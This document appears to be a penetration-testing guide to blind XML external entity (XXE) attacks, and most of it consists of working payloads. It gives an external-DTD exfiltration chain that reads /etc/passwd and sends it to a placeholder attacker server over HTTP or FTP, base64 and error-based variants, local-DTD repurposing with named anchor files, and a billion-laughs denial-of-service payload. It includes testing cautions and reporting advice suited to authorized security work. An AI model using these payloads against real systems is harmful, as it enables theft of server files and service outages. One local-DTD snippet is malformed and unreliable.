# Blind XXE: OAST Detection, OOB Exfiltration, Error-Based Extraction & DoS

Blind XXE means the application is vulnerable but never reflects entity values back in its response — direct file disclosure isn't possible, and you need one of the techniques below to confirm and exploit it.

## Step 1: confirm injection exists via OAST

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-OAST-DOMAIN/probe"> ]>
<root><data>&xxe;</data></root>
```
A DNS lookup and/or HTTP hit on your Collaborator/interactsh domain confirms the parser resolves external entities at all. This is necessary groundwork but is **not yet a file-disclosure finding** — it only proves the primitive exists. Move to the exfiltration technique below before claiming file content was recovered.

## Step 2: out-of-band exfiltration via a malicious external DTD

This is the technique that actually recovers file content for a genuinely blind target. Host a DTD file on infrastructure you control, and reference it from the injection point:

```xml
<!-- In-band payload, sent to the vulnerable endpoint -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd"> %dtd; ]>
<root></root>
```

```dtd
<!-- evil.dtd, hosted on YOUR-SERVER -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%eval;
%exfil;
```
Walk through why this works: `%file` reads the target file into a parameter entity. `%eval` dynamically declares a *second* parameter entity (`%exfil`) whose definition embeds `%file`'s now-resolved content directly into a URL. When `%exfil` is referenced, the parser makes an HTTP request to that URL — sending the file's contents to your server in the request itself. This indirection through `%eval` exists because XML doesn't allow one parameter entity to directly reference another within a single definition in simpler ways — the dynamic-declaration trick is the standard workaround.

## Handling problem characters and long content

```
- Newlines and special characters in the target file can break the
  URL or get silently truncated. Base64-encode the file content
  before embedding it, using a wrapper the parser supports (PHP's
  libxml respects php://filter):
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

- If the encoded payload becomes too long for a single URL ("URI too
  long" errors), or if you specifically need to preserve characters
  HTTP requests handle poorly, fall back to FTP instead of HTTP as
  the exfiltration channel — the file content becomes the FTP
  username/password in the connection attempt, which a simple
  netcat-based mock FTP listener (just enough to receive the
  handshake) can capture without needing real FTP authentication to
  complete:
    <!ENTITY % all "<!ENTITY &#x25;exfil SYSTEM 'ftp://attacker:%file;@YOUR-SERVER/'>">

- If even small single-line files like /etc/hostname work but larger
  multi-line files like /etc/passwd don't, that's a strong signal
  the limitation is newline/length-related, not that the technique
  itself failed — switch to the base64 or FTP approach rather than
  concluding the target isn't exploitable.
```

## Error-based extraction (when OOB connections are entirely blocked)

If the network is locked down and no outbound connection (HTTP, DNS, FTP) is possible at all, you can still sometimes recover data via parser error messages, exploiting a quirk in how internal vs. external DTD declarations interact.

**With a remote external DTD still loadable** (just not for direct exfiltration — only definition loading):
```dtd
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///nonexistent/%file;">
```
Referencing a deliberately invalid path that incorporates the file content causes a parsing error whose message includes the (now nonexistent, but content-embedding) path — leaking the value through the error text instead of a network callback.

**With outbound connections fully blocked (no external DTD load possible at all):** the XML specification allows a parameter entity to be redefined when the original declaration came from an *external* source and the redefinition is in the *internal* subset — but not the other way around. This means you can exploit a **local DTD file already present on the server's filesystem** by invoking it and then redefining one of its entities to trigger an error containing your target file's content:
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/svg/svg10.dtd">
  <!ENTITY % SYSTEM '<!ENTITY % file SYSTEM "file:///etc/passwd"> ...'>
  %local_dtd;
]>
```
Common local DTD files that ship on most Linux systems and are worth trying as the "local_dtd" anchor: `/usr/share/xml/fontconfig/fonts.dtd`, `/usr/share/xml/svg/svg10.dtd`, `/usr/share/xml/svg/svg11.dtd`, `/usr/share/yelp/dtd/docbookx.dtd`. The exact entity name you need to redefine depends on that DTD's actual contents — inspect a copy of the same DTD (these are standard, publicly available files) to find an entity name it declares that you can legitimately redefine.

## Billion laughs / exponential entity expansion (DoS)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!-- continuing this pattern a few more levels causes exponential
       expansion — each level multiplies the previous by ~10 -->
]>
<lolz>&lol2;</lolz>
```
A small input causing the parser to attempt to materialize gigabytes of expanded text in memory is the mechanism — only test this with explicit authorization for availability-impacting testing, against a non-production instance if one is available, and stop at a controlled, limited demonstration rather than actually crashing a production service.

## What makes a blind-XXE finding confirmed, not theoretical

Real, recovered file content — via the external-DTD exfiltration technique, the error-based technique, or local-DTD repurposing — not just a bare OAST ping. A confirmed-but-empty OAST interaction is still worth reporting, but label it precisely as "confirmed entity resolution, exfiltration not yet demonstrated" rather than claiming file disclosure you haven't actually shown.
